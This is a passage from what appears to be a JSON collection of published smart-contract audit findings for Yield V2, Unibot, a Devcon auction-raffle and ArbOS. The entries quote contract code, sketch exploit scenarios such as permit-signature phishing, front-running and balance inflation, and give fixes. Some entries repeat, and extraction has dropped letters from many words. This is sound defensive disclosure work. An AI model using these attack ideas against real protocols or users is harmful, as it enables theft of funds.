        "body": "The use of EIP-2612 increases the risk of permit function front-running as well as phishing attacks. EIP-2612 uses signatures as an alternative to the traditional approve and transferFrom ow. These signatures allow a third party to transfer tokens on behalf of a user, with verication of a signed message. The use of EIP-2612 makes it possible for an external party to front-run the permit function by submitting the signature rst. Then, since the signature has already been used and the funds have been transferred, the actual caller's transaction will fail. This could also aect external contracts that rely on a successful permit() call for execution. EIP-2612 also makes it easier for an attacker to steal a users tokens through phishing by asking for signatures in a context unrelated to the Yield Protocol contracts. The hash message may look benign and random to the user. Exploit Scenario Bob has 1,000 iTokens. Eve creates an ERC20 token with a malicious airdrop called ProofOfSignature. To claim the tokens, participants must sign a hash. Eve generates a hash to transfer 1,000 iTokens from Bob. Eve asks Bob to sign the hash to get free tokens. Bob signs the hash, and Eve uses it to steal Bobs tokens. Recommendations Short term, develop user documentation on edge cases in which the signature-forwarding process can be front-run or an attacker can steal a users tokens via phishing. Long term, document best practices for Yield Protocol users. In addition to taking other precautions, users must do the following:  Be extremely careful when signing a message  Avoid signing messages from suspicious sources 24 Yield V2  Always require hashing schemes to be public References  EIP-2612 Security Considerations 25 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Failure to use the batched transaction ow may enable theft through front-running ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The Yield Protocol relies on users interacting with the Ladle contract to batch their transactions (e.g., to transfer funds and then mint/burn the corresponding tokens in the same series of transactions). When they deviate from the batched transaction ow, users may lose their funds through front-running. For example, an attacker could front-run the startPool() function to steal the initial mint of strategy tokens. The function relies on liquidity provider (LP) tokens to be transferred to the Strategy contract and then used to mint strategy tokens. The rst time that strategy tokens are minted, they are minted directly to the caller: /// @dev Start the strategy investments in the next pool /// @notice When calling this function for the first pool, some underlying needs to be transferred to the strategy first, using a batchable router. function startPool() external poolNotSelected { [...] // Find pool proportion p = tokenReserves/(tokenReserves + fyTokenReserves) // Deposit (investment * p) base to borrow (investment * p) fyToken // (investment * p) fyToken + (investment * (1 - p)) base = investment // (investment * p) / ((investment * p) + (investment * (1 - p))) = p // (investment * (1 - p)) / ((investment * p) + (investment * (1 - p))) = 1 - p uint256 baseBalance = base.balanceOf(address(this)); 26 Yield V2 require(baseBalance > 0, \"No funds to start with\"); uint256 baseInPool = base.balanceOf(address(pool_)); uint256 fyTokenInPool = fyToken_.balanceOf(address(pool_)); uint256 baseToPool = (baseBalance * baseInPool) / (baseInPool + fyTokenInPool); // Rounds down uint256 fyTokenToPool = baseBalance - baseToPool; // fyTokenToPool is rounded up // Mint fyToken with underlying base.safeTransfer(baseJoin, fyTokenToPool); fyToken.mintWithUnderlying(address(pool_), fyTokenToPool); // Mint LP tokens with (investment * p) fyToken and (investment * (1 - p)) base base.safeTransfer(address(pool_), baseToPool); (,, cached) = pool_.mint(address(this), true, 0); // We don't care about slippage, because the strategy holds to maturity and profits from sandwiching if (_totalSupply == 0) _mint(msg.sender, cached); // Initialize the strategy if needed invariants[address(pool_)] = pool_.invariant(); // Cache the invariant to help the frontend calculate profits emit PoolStarted(address(pool_)); } Figure 9.1: strategy-v2/contracts/Strategy.sol#L146-L194 Exploit Scenario Bob adds underlying tokens to the Strategy contract without using the router. Governance calls setNextPool() with a new pool address. Eve, an attacker, front-runs the call to the startPool() function to secure the strategy tokens initially minted for Bobs underlying tokens. Recommendations Short term, to limit the impact of function front-running, avoid minting tokens to the callers of the protocols functions. 27 Yield V2 Long term, document the expectations around the use of the router to batch transactions; that way, users will be aware of the front-running risks that arise when it is not used. Additionally, analyze the implications of all uses of msg.sender in the system, and ensure that users cannot leverage it to obtain tokens that they do not deserve; otherwise, they could be incentivized to engage in front-running. 28 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. Strategy contracts balance-tracking system could facilitate theft ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "Strategy contract functions use the contracts balance to determine how many liquidity or base tokens to provide to a user minting or burning tokens. The Strategy contract inherits from the ERC20Rewards contract, which denes a reward token and a reward distribution schedule. An admin must send reward tokens to the Strategy contract to fund its reward payouts. This ow relies on an underlying assumption that the reward token will be dierent from the base token. /// @dev Set a rewards token. /// @notice Careful, this can only be done once. function setRewardsToken(IERC20 rewardsToken_) external auth { } require(rewardsToken == IERC20(address(0)), \"Rewards token already set\"); rewardsToken = rewardsToken_; emit RewardsTokenSet(rewardsToken_); Figure 10.1: yield-utils-v2/contracts/token/ERC20Rewards.sol#L58-L67 The burnForBase() function tracks the Strategy contracts base token balance. If the base token is used as the reward token, the contracts base token balance will be inated to include the reward token balance (and the balance tracked by the function will be incorrect). As a result, when attempting to burn strategy tokens, a user may receive more base tokens than he or she deserves for the number of strategy tokens being burned: /// @dev Burn strategy tokens to withdraw base tokens. It can be called only when a pool is not selected. 29 Yield V2 /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router. function burnForBase(address to) external poolNotSelected returns (uint256 withdrawal) { } // strategy * burnt/supply = withdrawal uint256 burnt = _balanceOf[address(this)]; withdrawal = base.balanceOf(address(this)) * burnt / _totalSupply; _burn(address(this), burnt); base.safeTransfer(to, withdrawal); Figure 10.2: strategy-v2/contracts/Strategy.sol#L258-L271 Exploit Scenario Bob deploys the Strategy contract; DAI is set as a base token of that contract and is also dened as the reward token in the ERC20Rewards contract. After a pool has ocially been closed, Eve uses burnWithBase() to swap base tokens for strategy tokens. Because the calculation takes into account the base tokens balance, she receives more base tokens than she should. Recommendations Short term, add checks to verify that the reward token is not set to the base token, liquidity token, fyToken, or strategy token. These checks will ensure that users cannot leverage contract balances that include reward token balances to turn a prot. Long term, analyze all token interactions in the contract to ensure they do not introduce unexpected behavior into the system. 30 Yield V2 11. Insu\u0000cient protection of sensitive keys Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-YP2-011 Target: hardhat.config.js",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Lack of limits on the total amount of collateral sold at auction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "MakerDAOs Dutch auction system imposes limits on the amount of collateral that can be auctioned o at once (both the total amount and the amount of each collateral type). If the MakerDAO system experienced a temporary oracle failure, these limits would prevent a catastrophic loss of all collateral. The Yield Protocol auction system is similar to MakerDAOs but lacks such limits, meaning that all of its collateral could be auctioned o for below-market prices. Exploit Scenario The oracle price feeds (or other components of the system) experience an attack or another issue. The incident causes a majority of the vaults to become undercollateralized, triggering auctions of those vaults collateral. The protocol then loses the majority of its collateral, which is auctioned o for below-market prices, and enters an undercollateralized state from which it cannot recover. Recommendations Short term, introduce global and type-specic limits on the amount of collateral that can be auctioned o at the same time. Ensure that these limits protect the protocol from total liquidation caused by bugs while providing enough liquidation throughput to accommodate all possible price changes. Long term, wherever possible, introduce limits for the systems variables to ensure that they remain within the expected ranges. These limits will minimize the impact of bugs or attacks against the system. 33 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Lack of incentives for calls to Witch.auction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "Users call the Witch contracts auction function to start auctions for undercollateralized vaults. To reduce the losses incurred by the protocol, this function should be called as soon as possible after a vault has become undercollateralized. However, the Yield Protocol system does not provide users with a direct incentive to call Witch.auction. By contrast, the MakerDAO system provides rewards to users who initialize auctions. Exploit Scenario A stock market crash triggers a crypto market crash. The numerous corrective arbitrage transactions on the Ethereum network cause it to become congested, and gas prices skyrocket. To keep the Yield Protocol overcollateralized, many undercollateralized vaults must be auctioned o. However, because of the high price of calls to Witch.auction, and the lack of incentives for users to call it, too few auctions are timely started. As a result, the system incurs greater losses than it would have if more auctions had been started on time. Recommendations Short term, reward those who call Witch.auction to incentivize users to call the function (and to do so as soon as possible). Long term, ensure that users are properly incentivized to perform all important operations in the protocol. 34 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Contracts used as dependencies do not track upstream changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "Math64x64 has been copied and pasted into the yieldspace-v2 repository. The code documentation does not specify the exact revision that was made or whether the code was modied. As such, the contracts will not reliably reect updates or security xes implemented in this dependency, as those changes must be manually integrated into the contracts. Exploit Scenario Math64x64 receives an update with a critical x for a vulnerability. An attacker detects the use of a vulnerable contract and can then exploit the vulnerability against any of the Yield Protocol contracts that use Math64x64. Recommendations Short term, review the codebase and document the source and version of the dependency. Include third-party sources as submodules in your Git repositories to maintain internal path consistency and ensure that any dependencies are updated periodically. Long term, use an Ethereum development environment and NPM to manage packages in the project. 35 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Cauldrons give and tweak functions lack vault existence checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The Cauldron depends on the caller (the Ladle) to perform a check that is critical to the internal consistency of the Cauldron. The Cauldron should provide an API that makes the creation of malformed vaults impossible. The Cauldron contracts give(vaultId, receiver) function does not check whether the vaultId passed to it is associated with an existent vault. If the ID is not that of an existent vault, the protocol will create a new vault, with the owner set to receiver and all other elds set to zero. The existence of such a malformed vault could have negative consequences for the protocol. For example, the build function checks the existence of a vault by verifying that vault.seriesId is not zero. The build function could be abused to set the seriesId and ilkId of a malformed vault. The Cauldrons tweak function also fails to check the existence of the vault it operates on and can be used to create a vault without an owner. function _give(bytes12 vaultId, address receiver) internal returns(DataTypes.Vault memory vault) { } require (vaultId != bytes12(0), \"Vault id is zero\"); vault = vaults[vaultId]; vault.owner = receiver; vaults[vaultId] = vault; emit VaultGiven(vaultId, receiver); /// @dev Transfer a vault to another user. function give(bytes12 vaultId, address receiver) external auth returns(DataTypes.Vault memory vault) 36 Yield V2 { } vault = _give(vaultId, receiver); Figure 15.1: The give and _give functions in the Cauldron contract (vault-v2/contracts/Cauldron.sol#L228-L246) Exploit Scenario Bob, a Yield Protocol developer, adds a new public function that calls Cauldron.give and does not perform a vault existence check. Any user can call the function to create a malformed vault, with unclear consequences for the protocol. Recommendations Short term, ensure that the protocol performs zero-value checks for all values that should not be set to zero. Long term, follow the guidance on data validation laid out in TOB-YP2-016. 37 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Problematic approach to data validation and access controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "Many parts of the codebase lack data validation. The Yield team indicated that these omissions were largely intentional, as it is the responsibility of the front end of other contracts to ensure that data is valid. The codebase lacks zero-value checks for the following parameters (among others):  The parameters of LadleStorage.constructor  The receiver parameter of Cauldron._give  The parameters of Ladle.give  The to parameter of Pool.buyBase and Pool.sellBase  The oracle parameter of Cauldron.setLendingOracle and Cauldron.setSpotOracle  The owner parameter of Cauldron.build  The value parameter of FYToken.point  The parameters of Witch.constructor It also lacks zero-value checks for the module parameter of Ladle.moduleCall and Ladle.addModule, and the moduleCall and addModule functions do not perform contract existence checks. Moreover, many functions do not contain exhaustive data validation and instead rely on their caller or callee to partially handle data validation. As a result, the protocols data validation is spread across multiple functions and, in certain cases, across multiple contracts. For example, the Cauldron contracts give and tweak functions (likely among others) require the caller, which is usually the Ladle, to check the existence of the vault being modied. The Ladle is therefore responsible for ensuring the integrity of the Cauldrons internal data. This diuse system of data validation requires developers and auditors to increase their focus on the context of a call, making their work more dicult. More importantly, though, it makes the code less robust. Developers cannot modify a function in isolation; instead, they 38 Yield V2 have to look at all call sites to ensure that required validation is performed. This process is error-prone and increases the likelihood that high-severity issues (like that described in TOB-YP2-006) will be introduced into the system. The deduplication of these checks (such that data validation occurs only once per call stack) is not a secure coding practice; nor is the omission of data validation. We strongly believe that code intended to securely handle millions of dollars in assets should be developed using the most secure coding practices possible. The protocols micro-optimizations do not appear to have any benets beyond a reduction in gas costs. However, these savings are minor. For example, performing a zero check of a value already on the stack would cost 3 units of gas (see the ISZERO opcode). Even with a fairly high gas price of 200 gwei and an ether price of $3,000, this operation would cost $0.0018. Performing 10 additional zero-value checks per transaction would cost only around 2 cents. Similarly, a read of a value in cold storage would have a gas cost of 2,100 (see the SLOAD opcode); with the values above, that would be about $1.20. Warm access (that is, an additional read operation from the same storage slot within the same transaction) would cost only 100 units of gas, or about 6 cents. We believe the low cost of these checks to be a reasonable price for the increased robustness that would accompany additional data validation. We do not agree that it is best to omit these checks, as the relatively small gas savings come at the expense of defense in depth, which is more important. Exploit Scenario A Yield Protocol developer adds a new function that calls a pre-existing function. This pre-existing function makes implicit assumptions about the data validation that will occur before it is called. However, the developer is not fully aware of these implicit assumptions and accidentally leaves out important data validation, creating an attack vector that can be used to steal funds from the protocol. Recommendations Long term, ensure that the protocols functions perform exhaustive validation of their inputs and of the systems state and that they do not assume that validation has been performed further up in the call stack (or will be performed further down). Such assumptions make the code brittle and increase the likelihood that vulnerabilities will be introduced when the code is modied. Any implicit assumptions regarding data validation or access controls should be explicitly documented; otherwise, modications to the code could break those important assumptions. 39 Yield V2 In general, a contract should not assume that its functions will always be called with valid data or that those calls will be made only when the state of the system allows it. This applies even to functions that can be called only by the protocols contracts, as a protocol contract could be replaced by a malicious version. An additional layer of defense could mitigate the fallout of such a scenario. 40 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. isContract may behave unexpectedly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The Yield Protocol system relies on the isContract() function in a few of the Solidity les to check whether there is a contract at the target address. However, in Solidity, there is no general way to denitively determine that, as there are several edge cases in which the underlying function extcodesize() can return unexpected results. In addition, there is no way to guarantee that an address that is that of a contract (or one that is not) will remain that way in the future. library IsContract { /// @dev Returns true if `account` is a contract. function isContract(address account) internal view returns (bool) { // This method relies on extcodesize, which returns 0 for contracts in // construction, since the code is only stored at the end of the // constructor execution. return account.code.length > 0; } } Figure 17.1: yield-utils-v2/contracts/utils/IsContract.sol#L6-L14 Exploit Scenario A function, f, within the Yield Protocol codebase calls isContract() internally to guarantee that a certain method is not callable by another contract. An attacker creates a contract that calls f from within its constructor, and the call to isContract() within f returns false, violating the guarantee. Recommendations Short term, clearly document for developers that isContract() is not guaranteed to return an accurate value, and emphasize that it should never be used to provide an assurance of security. Long term, be mindful of the fact that the Ethereum core developers consider it poor practice to attempt to dierentiate between end users and contracts. Try to avoid this practice entirely if possible. 41 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "10. Strategy contracts balance-tracking system could facilitate theft ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "Strategy contract functions use the contracts balance to determine how many liquidity or base tokens to provide to a user minting or burning tokens. The Strategy contract inherits from the ERC20Rewards contract, which denes a reward token and a reward distribution schedule. An admin must send reward tokens to the Strategy contract to fund its reward payouts. This ow relies on an underlying assumption that the reward token will be dierent from the base token. /// @dev Set a rewards token. /// @notice Careful, this can only be done once. function setRewardsToken(IERC20 rewardsToken_) external auth { } require(rewardsToken == IERC20(address(0)), \"Rewards token already set\"); rewardsToken = rewardsToken_; emit RewardsTokenSet(rewardsToken_); Figure 10.1: yield-utils-v2/contracts/token/ERC20Rewards.sol#L58-L67 The burnForBase() function tracks the Strategy contracts base token balance. If the base token is used as the reward token, the contracts base token balance will be inated to include the reward token balance (and the balance tracked by the function will be incorrect). As a result, when attempting to burn strategy tokens, a user may receive more base tokens than he or she deserves for the number of strategy tokens being burned: /// @dev Burn strategy tokens to withdraw base tokens. It can be called only when a pool is not selected. 29 Yield V2 /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router. function burnForBase(address to) external poolNotSelected returns (uint256 withdrawal) { } // strategy * burnt/supply = withdrawal uint256 burnt = _balanceOf[address(this)]; withdrawal = base.balanceOf(address(this)) * burnt / _totalSupply; _burn(address(this), burnt); base.safeTransfer(to, withdrawal); Figure 10.2: strategy-v2/contracts/Strategy.sol#L258-L271 Exploit Scenario Bob deploys the Strategy contract; DAI is set as a base token of that contract and is also dened as the reward token in the ERC20Rewards contract. After a pool has ocially been closed, Eve uses burnWithBase() to swap base tokens for strategy tokens. Because the calculation takes into account the base tokens balance, she receives more base tokens than she should. Recommendations Short term, add checks to verify that the reward token is not set to the base token, liquidity token, fyToken, or strategy token. These checks will ensure that users cannot leverage contract balances that include reward token balances to turn a prot. Long term, analyze all token interactions in the contract to ensure they do not introduce unexpected behavior into the system. 30 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Insu\u0000cient protection of sensitive keys ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "Sensitive information such as Etherscan keys, API keys, and an owner private key used in testing is stored in the process environment. This method of storage could make it easier for an attacker to compromise the keys; compromise of the owner key, for example, could enable an attacker to gain owner privileges and steal funds from the protocol. The following portion of the hardhat.config.js le uses secrets from the process environment: let mnemonic = process.env.MNEMONIC if (!mnemonic) { try { mnemonic = fs.readFileSync(path.resolve(__dirname, '.secret')).toString().trim() } catch(e){} } const accounts = mnemonic ? { mnemonic, }: undefined let etherscanKey = process.env.ETHERSCANKEY if (!etherscanKey) { try { etherscanKey = fs.readFileSync(path.resolve(__dirname, '.etherscanKey')).toString().trim() } catch(e){} } Figure 11.1: vault-v2/hardhat.config.ts#L67-L82 31 Yield V2 Exploit Scenario Alice, a member of the Yield team, has secrets stored in the process environment. Eve, an attacker, gains access to Alices device and extracts the Infura and owner keys from it. Eve then launches a denial-of-service attack against the front end of the system and uses the owner key to steal the funds held by the owner on the mainnet. Recommendations Short term, to prevent attackers from accessing system funds, avoid using hard-coded secrets or storing secrets in the process environment. Long term, use a hardware security module to ensure that keys can never be extracted. 32 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Use of multiple repositories ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The Yield Protocol code is spread across four repositories. These repositories are tightly coupled, and the code is broken up somewhat arbitrarily. This makes it more dicult to navigate the codebase and to obtain a complete picture of the code that existed at any one time. It also makes it impossible to associate one version of the protocol with one commit hash. Instead, each version requires four commit hashes. Exploit Scenario The master branch of one repository of the protocol is not compatible with the master branch of another. The contracts incompatibility leads to problems when a new version of the protocol is deployed. Recommendations To maintain one canonical version of the protocol, avoid using multiple repositories for the contracts. 42 Yield V2 A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Missing unit tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-unibot-securityreview.pdf",
        "body": "There were no unit tests provided for the target contract. This is problematic for a few reasons: 1. Smart contracts often have an intricate network of dependencies. Modifying one section of the code can have unforeseen consequences on other sections. Testing helps detect these ripple eects that may not be immediately apparent. 2. Even small changes in the code can introduce vulnerabilities. In the case of smart contracts, these vulnerabilities can be exploited, resulting in substantial nancial losses. Testing ensures that the new code does not create any security weaknesses. 3. The system lacks programmatic guarantees around the data validation, access controls, and arithmetic operations performed by the system. 4. Even if the original project was thoroughly tested, the new changes may not be covered by the existing tests. Implementing new tests will help ensure that the modied lines of code are adequately covered. 5. Writing tests can also serve as a form of documentation, helping developers and security researchers understand the intended functionality and any changes made to the contract. 6. For projects that have a community of users or stakeholders, it is essential to maintain trust. One way to reinforce this trust is by demonstrating, through testing, that the contract remains secure and reliable even after changes have been made. Recommendations Short term, write unit tests for any existing and future custom functionality. Long term, consider integrating the test suite of the SwapRouter contract and updating any tests that are not relevant or must be updated. This will provide additional programmatic guarantees that any changes made by the Unibot team do not adversely aect the expected behavior of the router contract.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Missing unit tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-unibot-securityreview.pdf",
        "body": "There were no unit tests provided for the target contract. This is problematic for a few reasons:",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Lack of events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-unibot-securityreview.pdf",
        "body": "Several critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. For example, the setUnibotSettingAddress function, which is a privileged operation used to set critical state variables, does not emit an event that species which system state variable was updated (gure 2.1). function setUnibotSettingAddress(uint256 actionIndex, address _address, uint256 _factoryValue) external { require(msg.sender == ADMIN_WALLET_ADDR, \"NO_AUTH\"); // 1000 - FACTORY_SET_VALUE // 7777 - SET_ADMIN_WALLET // 7555 - SET_FEE_WALLET // 9999 = SWAP_ENABLED // 9111 = SWAP_DISABLED if (actionIndex == 1000) { // => FACTORY_SET_VALUE require(_factoryValue == 0 || _factoryValue == 2 || _factoryValue == 3, \"Invalid: 0 (disabled) || 2 (UniV2) || 3 (UniV3)\"); validFactoryVersion[_address] = _factoryValue; } else if (actionIndex == 7777) { // => SET_ADMIN_WALLET ADMIN_WALLET_ADDR = _address; } else if (actionIndex == 7555) { // => SET_FEE_WALLET FEE_WALLET_ADDR = _address; } else if (actionIndex == 9999) { // => SWAP_ENABLED SWAP_ENABLED = true; } else if (actionIndex == 9111) { // => SWAP_DISABLED SWAP_ENABLED = false; } } Figure 2.1: The setUnibotSettingAddress function does not emit events (contracts/UnibotRouter_03_edit.sol#L3732-L3755) Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to take ownership of the ADMIN_WALLET_ADDR account and calls the setUnibotSettingAddress function to update the FEE_WALLET_ADDR to her own address, which allows her to steal user funds. Alice, a Unibot team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Risk of funds becoming trapped if owner key is lost before ra\u0000e settlement ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-ethereum-foundation-devcon-auction-raffle-securityreview.pdf",
        "body": "Due to overly restrictive access controls on the functions used to settle the auction and rae, in the event that access to the owner key is lost before these are settled, there will be no way for users to reclaim their funds, even for unsuccessful bids. A previous version of the AuctionRaffle contract required a random seed value when calling settleRaffle , so the settlement functions included the onlyOwner modier. The current version of the contract relies on Chainlinks Veriable Random Function (VRF) service to request randomness on-chain as part of the rae settlement ow, and neither the settleAuction or settleRaffle functions take any parameters (gure 1.1). /** * @notice Draws auction winners and changes contract state to AUCTION_SETTLED. * @dev Removes highest bids from the heap, sets their WinType to AUCTION and adds them to _auctionWinners array. * Temporarily adds auction winner bidderIDs to a separate heap and then retrieves them in descending order. * This is done to efficiently remove auction winners from _raffleParticipants array as they no longer take part * in the raffle. */ function settleAuction () external onlyOwner onlyInState(State.BIDDING_CLOSED) { _settleState = SettleState.AUCTION_SETTLED; ... } /** * @notice Initiate raffle draw by requesting a random number from Chainlink VRF. */ function settleRaffle () external onlyOwner onlyInState(State.AUCTION_SETTLED) returns ( uint256 ) { ... } Figure 1.1: The settleAuction and settleRaffle function declarations ( AuctionRaffle.sol#L122-L161 ) 11 Devcon Auction-Rae Security Assessment In order for users to recover their funds (for the golden ticket winner of the rae, funds in excess of the reserve price for other rae winners, and all other unsuccessful bidders), the contract must be in the RAFFLE_SETTLED state, which is the state the contract remains in until the claiming period closes (gure 1.2). function getState () public view returns (State) { if ( block.timestamp >= _claimingEndTime) { return State.CLAIMING_CLOSED; } if (_settleState == SettleState.RAFFLE_SETTLED) { return State.RAFFLE_SETTLED; } if (_settleState == SettleState.AUCTION_SETTLED) { return State.AUCTION_SETTLED; } if ( block.timestamp >= _biddingEndTime) { return State.BIDDING_CLOSED; } if ( block.timestamp >= _biddingStartTime) { return State.BIDDING_OPEN; } return State.AWAITING_BIDDING; } Figure 1.2: The AuctionRaffle contracts getState function, which lists the contracts states in reverse chronological order ( AuctionRaffle.sol#L327-L324 ) In the unlikely event that the team managing the AuctionRaffle contract loses access to the contracts owner key before settling the rae, according to gure 1.2, the contract state machine will be unable to progress until the current time reaches the value in the _claimingEndTime variable. After that point, the only notable function in the contract is withdrawUnclaimedFunds (gure 1.3), which can be called only by the contracts owner. As a result, any funds escrowed in the contract as part of the auction and rae will be unrecoverable. /** * @notice Allows the owner to withdraw all funds left in the contract by the participants. * Callable only after the claiming window is closed. */ function withdrawUnclaimedFunds () external onlyOwner onlyInState(State.CLAIMING_CLOSED) { uint256 unclaimedFunds = address ( this ).balance; payable (owner()).transfer(unclaimedFunds); } Figure 1.3: The withdrawUnclaimedFunds function body ( AuctionRaffle.sol#L234-L241 ) 12 Devcon Auction-Rae Security Assessment Exploit Scenario The team loses access to the owner key of the AuctionRaffle contract late in the bidding process. The auction and rae can no longer be settled due to the onlyOwner modier on the functions that trigger these state transitions, so the contract will not enter the claim period. As a result, all of the funds for successful and unsuccessful bids will be considered unclaimed and will be recoverable by the contract owner only if access to the owner key is regained. Recommendations Short term, remove the onlyOwner modier from the settleAuction and settleRaffle functions in the AuctionRae contract. This will allow the system to progress through all of its states without owner intervention once deployed. 13 Devcon Auction-Rae Security Assessment A. Code Maturity Categories The following tables describe the code maturity categories and rating criteria used in this document. Code Maturity Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Discrepancies between checks performed by arbitrator and OneStepProverHostIo and OneStepProverO contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-offchainlabsarbos-securityreview.pdf",
        "body": "The arbitrator and the OneStepProverHostIo and OneStepProverO contracts have discrepancies between some of the checks they perform. The arbitrator and the OneStepProverHostIo contract check that the preimage type is valid when executing the ReadPreImage opcode. However, they perform these checks in dierent orders, which may lead to inconsistencies. The OneStepProverHostIo contracts executeReadPreImage function rst performs other checks that could set the machine state to Errored (gure 1.1), which would later cause the function to revert if the preimage type is not valid. function executeReadPreImage( ExecutionContext calldata, Machine memory mach, Module memory mod, Instruction calldata inst, bytes calldata proof ) internal view { uint256 preimageOffset = mach.valueStack.pop().assumeI32(); uint256 ptr = mach.valueStack.pop().assumeI32(); if (preimageOffset % 32 != 0 || ptr + 32 > mod.moduleMemory.size || ptr % LEAF_SIZE != 0) { mach.status = MachineStatus.ERRORED; return; } ... if (inst.argumentData == 0) { ... } else if (inst.argumentData == 1) { ... } else if (inst.argumentData == 2) { ... } else { revert(\"UNKNOWN_PREIMAGE_TYPE\"); } ... } Figure 1.1: A snippet the executeReadPreImage function in OneStepProverHostIo.sol#L123-L245 The arbitrator instead rst checks whether the preimage type is valid and then performs the other checks that could set the machine state to Errored (gure 1.2). pub fn step_n(&mut self, n: u64) -> Result<()> { ... Opcode::ReadPreImage => { let offset = self.value_stack.pop().unwrap().assume_u32(); let ptr = self.value_stack.pop().unwrap().assume_u32(); let preimage_ty = PreimageType::try_from(u8::try_from(inst.argument_data)?)?; // Preimage reads must be word aligned if offset % 32 != 0 { error!(); } if let Some(hash) = module.memory.load_32_byte_aligned(ptr.into()) { ... ... } Figure 1.2: A snippet of the step_n function in machine.rs#L1866-L1874 This discrepancy between the order of checks in these two locations could cause inconsistencies in the machine status, such as when a preimage type is not valid and the oset is not modulo 32. However, the severity of this nding is rated as informational because, as suggested by the Ochain team, other important assumptions need to be broken; for example, the WASM module root would need to be malicious. There are other similar discrepancies between the checks performed by the arbitrator and the OneStepProverO contract. For example, when handling the argumentData value for the Call operation, the contract checks the result of the downcast to ensure there is no precision loss (gure 1.3), but the arbitrator does not (gure 1.4). The arbitrator does not perform this check in the ArbitraryJump and ArbitraryJumpIf operations, either. function executeCall( Machine memory mach, Module memory, Instruction calldata inst, bytes calldata ) internal pure { ... // Jump to the target uint32 idx = uint32(inst.argumentData); require(idx == inst.argumentData, \"BAD_CALL_DATA\"); ... } Figure 1.3: A snippet of the executeCall function in OneStepProver0.sol#L117-L136 pub fn step_n(&mut self, n: u64) -> Result<()> { ... Opcode::Call => { let current_frame = self.frame_stack.last().unwrap(); self.value_stack.push(Value::InternalRef(self.pc)); self.value_stack .push(Value::I32(current_frame.caller_module)); self.value_stack .push(Value::I32(current_frame.caller_module_internals)); self.pc.func = inst.argument_data as u32; self.pc.inst = 0; func = &module.funcs[self.pc.func()]; } ... } Figure 1.4: A snippet of the Call function in machine.rs#L1466-L1476 Recommendations Short term, in the arbitrators step_n function, move the preimage_ty variable inside the if/let block so that it performs the same order of checks as the OneStepProverHostIo contracts executeReadPreImage function. Add the missing downcast result check to the arbitrators Call, ArbitraryJump, and ArbitraryJumpIf opcodes. Long term, when implementing the same logic multiple times, such as in these cases, make sure to implement it in the same way, even if divergences would be safe, to simplify the review process.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
